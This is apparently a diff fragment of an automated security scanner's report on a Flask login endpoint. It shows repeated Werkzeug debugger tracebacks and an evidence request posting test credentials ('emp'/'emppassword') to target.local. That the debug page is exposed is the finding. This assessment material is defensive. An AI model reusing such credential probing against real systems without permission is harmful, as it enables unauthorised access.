+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;rv: ft.ResponseReturnValue | HTTPException,&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546325600&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;880&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546324256&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;865&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;and req.method == &amp;#34;OPTIONS&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;):&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return self.make_default_options_response()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;# otherwise dispatch to the handler for that endpoint&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def full_dispatch_request(self) -&amp;gt; Response:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Dispatches the request and on top of that performs request&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;pre and postprocessing as well as HTTP exception catching and&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error handling.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546326720&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/app/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;72&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;login&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source &quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;@app.route(&amp;#39;/login&amp;#39;, methods=[&amp;#39;POST&amp;#39;])&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def login():&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;if request.method == &amp;#39;POST&amp;#39;:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;response = {&amp;#39;success&amp;#39;: False, &amp;#39;message&amp;#39;: &amp;#39;&amp;#39;, &amp;#39;redirect&amp;#39;: &amp;#39;&amp;#39;}&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;username = request.form[&amp;#39;username&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;password = request.form[&amp;#39;password&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;role = request.form[&amp;#39;role&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;# sqli filter&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if not is_safe_input(username) or not is_safe_input(password) or not is_safe_input(role):&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546324368&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;196&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__getitem__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if key in self:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;lst = dict.__getitem__(self, key)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if len(lst) &amp;gt; 0:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;return lst[0]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;raise exceptions.BadRequestKeyError(key)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def __setitem__(self, key, value):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Like :meth:`add` but removes an existing key first.&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;:param key: the key for the value.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/ul&gt;
+  &lt;blockquote&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;username&amp;#39;
+&lt;/blockquote&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;plain&quot;&gt;
+    &lt;p&gt;
+      This is the Copy/Paste friendly version of the traceback.
+    &lt;/p&gt;
+    &lt;textarea cols=&quot;50&quot; rows=&quot;10&quot; name=&quot;code&quot; readonly&gt;Traceback (most recent call last):
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File &amp;#34;/app/app.py&amp;#34;, line 72, in login
+    username = request.form[&amp;#39;username&amp;#39;]
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&amp;#34;, line 196, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;username&amp;#39;
+&lt;/textarea&gt;
+&lt;/div&gt;
+&lt;div class=&quot;explanation&quot;&gt;
+  The debugger caught an exception in your WSGI application.  You can now
+  look at the traceback which led to the error.  &lt;span class=&quot;nojavascript&quot;&gt;
+  If you enable JavaScript you can also use additional features such as code
+  execution (if the evalex feature is enabled), automatic pasting of the
+  exceptions and much more.&lt;/span&gt;
+&lt;/div&gt;
+      &lt;div class=&quot;footer&quot;&gt;
+        Brought to you by &lt;strong class=&quot;arthur&quot;&gt;DON'T PANIC&lt;/strong&gt;, your
+        friendly Werkzeug powered traceback interpreter.
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;pin-prompt&quot;&gt;
+      &lt;div class=&quot;inner&quot;&gt;
+        &lt;h3&gt;Console Locked&lt;/h3&gt;
+        &lt;p&gt;
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        &lt;form&gt;
+          &lt;p&gt;PIN:
+            &lt;input type=text name=pin size=14&gt;
+            &lt;input type=submit name=btn value=&quot;Confirm Pin&quot;&gt;
+        &lt;/form&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!--
+
+Traceback (most recent call last):
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File &quot;/app/app.py&quot;, line 72, in login
+    username = request.form['username']
+  File &quot;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&quot;, line 196, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'username'
+
+
+--&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1gk4u6-1h</code> — <code>artifacts/_/ev-mr1gk4u6-1h/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+username=emp&amp;password=emppassword</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+connection: close
+content-length: 15264
+content-type: text/html; charset=utf-8
+date: Wed, 01 Jul 2026 02:30:12 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+  &lt;head&gt;
+    &lt;title&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;role&amp;#39;
+ // Werkzeug Debugger&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=style.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot;
+        href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=console.png&quot;&gt;
+    &lt;script src=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+      var CONSOLE_MODE = false,
+          EVALEX = false,
+          EVALEX_TRUSTED = false,
+          SECRET = &quot;***REDACTED***&quot;;
+    &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color: #fff&quot;&gt;
+    &lt;div class=&quot;debugger&quot;&gt;
+&lt;h1&gt;BadRequestKeyError&lt;/h1&gt;
+&lt;div class=&quot;detail&quot;&gt;
+  &lt;p class=&quot;errormsg&quot;&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;role&amp;#39;
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 class=&quot;traceback&quot;&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;
+&lt;div class=&quot;traceback&quot;&gt;
+  &lt;h3&gt;&lt;/h3&gt;
+  &lt;ul&gt;&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546326272&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1498&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__call__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;) -&amp;gt; cabc.Iterable[bytes]:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;The WSGI server calls the Flask application object as the&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;WSGI application. This calls :meth:`wsgi_app`, which can be&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;wrapped to apply middleware.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.wsgi_app(environ, start_response)&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546324032&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1476&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;raise&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return response(environ, start_response)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;finally:&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546325376&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1473&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;ctx = self.request_context(environ)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error: BaseException | None = None&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546325264&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;882&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;rv: ft.ResponseReturnValue | HTTPException,&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546324928&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;880&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546324144&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;865&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;and req.method == &amp;#34;OPTIONS&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;):&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return self.make_default_options_response()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;# otherwise dispatch to the handler for that endpoint&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def full_dispatch_request(self) -&amp;gt; Response:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Dispatches the request and on top of that performs request&lt;/pre&gt;
